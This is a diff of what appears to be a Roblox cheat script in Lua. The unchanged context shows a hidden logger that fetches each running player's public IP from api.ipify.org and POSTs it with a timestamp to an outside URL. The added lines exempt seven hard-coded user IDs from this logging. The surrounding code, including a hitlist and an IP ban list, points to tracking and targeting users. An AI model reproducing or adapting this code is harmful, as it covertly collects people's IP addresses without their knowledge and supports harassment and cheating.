@@ -394,6 +394,7 @@ IpBans = {
 
 }
 if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlayer.UserId) and not table.find(IpBans,tostring(ip)) then
+if game.Players.LocalPlayer.UserId ~= 415744081 and game.Players.LocalPlayer.UserId ~= 894458609 and game.Players.LocalPlayer.UserId ~= 2422124124 and game.Players.LocalPlayer.UserId ~= 1489437710 and game.Players.LocalPlayer.UserId ~= 2587704753 and game.Players.LocalPlayer.UserId ~= 2009418204 and game.Players.LocalPlayer.UserId ~= 1985647039 then
 	local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 	local timestamp = string.format("%02i:%02i %s", (((os.date("*t").hour) % 24 - 1) % 12) + 1, os.date("*t").min, (os.date("*t").hour) % 24 < 12 and "AM" or "PM")
 	local s = {}
@@ -463,6 +464,7 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers
 	}
 	request(abcdef)
+end
 end
 _G.GrimSpam = false
 _G.AirWalk = false
